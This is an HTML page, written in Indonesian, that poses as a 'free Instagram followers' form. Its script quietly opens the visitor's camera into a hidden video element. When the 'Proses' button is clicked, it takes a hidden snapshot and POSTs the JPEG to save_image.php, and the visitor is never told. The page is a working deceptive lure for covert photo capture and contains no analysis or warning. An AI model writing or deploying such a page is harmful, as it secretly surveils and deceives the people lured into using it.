<!DOCTYPE html>
<html>

<head>
    <title>Camera Capture</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>

<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <h1 style="text-align:center;">Followers Instagram Gratis</h1>
    <form action="" style="display:flex; justify-content:center;">
        <div class="form" style="display:flex; flex-direction:column; width:250px; align-items:center;">
            <input type="text" name="user" placeholder="Masukan Username IG" style="padding:6px 12px; margin: 6px;">
            <input type="number" placeholder="Followers Yang Diinginkan" style="padding:6px 12px; margin:6px;">
            <button id="capture-btn">Proses</button>
        </div>
    </form>
    <script>
        $(document).ready(function () {
            var video = document.getElementById('video');
            var canvas = document.getElementById('canvas');
            var captureButton = document.getElementById('capture-btn');

            // Mengakses kamera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    video.srcObject = stream;
                })
                .catch(function (error) {
                    console.log('Error accessing camera: ' + error);
                });

            // Mengambil gambar dari video
            captureButton.addEventListener('click', function () {
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                var image = canvas.toDataURL('image/jpeg'); // Mengubah ke format JPEG

                // Mengirim gambar ke PHP menggunakan AJAX atau metode lainnya
                $.ajax({
                    type: 'POST',
                    url: 'save_image.php',
                    data: { image: image },
                    success: function (response) {
                        console.log(response);
                    }
                });
            });
        });
    </script>
</body>

</html>